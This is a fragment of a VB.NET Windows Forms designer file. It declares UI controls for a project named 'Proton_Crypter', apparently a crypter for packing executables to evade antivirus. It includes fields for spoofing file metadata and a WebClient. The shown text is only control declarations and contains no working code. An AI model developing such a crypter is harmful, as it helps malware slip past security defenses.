    Friend WithEvents Label14 As System.Windows.Forms.Label
    Friend WithEvents CustomCheckBox2 As Proton_Crypter.CustomCheckBox
    Friend WithEvents Label38 As System.Windows.Forms.Label
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents TextBoxNum3 As System.Windows.Forms.TextBox
    Friend WithEvents TextBoxNum4 As System.Windows.Forms.TextBox
    Friend WithEvents TextBoxNum1 As System.Windows.Forms.TextBox
    Friend WithEvents TextBoxNum2 As System.Windows.Forms.TextBox
    Friend WithEvents TextBoxCopyright As System.Windows.Forms.TextBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents TextBoxProduct As System.Windows.Forms.TextBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents TextBoxCompany As System.Windows.Forms.TextBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents TextBoxDescription As System.Windows.Forms.TextBox
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents TextBoxTitle As System.Windows.Forms.TextBox
    Friend WithEvents Label19 As System.Windows.Forms.Label
    Friend WithEvents MyButton5 As Proton_Crypter.MyButton
    Friend WithEvents MyButton6 As Proton_Crypter.MyButton
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents Label20 As System.Windows.Forms.Label
    Friend WithEvents Label21 As System.Windows.Forms.Label
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents RichTextBox2 As System.Windows.Forms.RichTextBox
    Friend WithEvents RichTextBox1 As System.Windows.Forms.RichTextBox
    Friend WithEvents PictureBox4 As System.Windows.Forms.PictureBox
    Friend WithEvents MyButton7 As Proton_Crypter.MyButton
    Friend WithEvents MyButton4 As Proton_Crypter.MyButton
    Friend WithEvents MyButton2 As Proton_Crypter.MyButton
    Friend WithEvents MyButton1 As Proton_Crypter.MyButton
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents Label18 As System.Windows.Forms.Label
    Friend WithEvents TextBox3 As System.Windows.Forms.TextBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents TabPage5 As System.Windows.Forms.TabPage
    Friend WithEvents CustomCheckBox6 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox7 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox5 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox4 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox3 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox8 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox9 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox10 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox11 As Proton_Crypter.CustomCheckBox
    Friend WithEvents CustomCheckBox12 As Proton_Crypter.CustomCheckBox
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents w As System.Net.WebClient
End Class
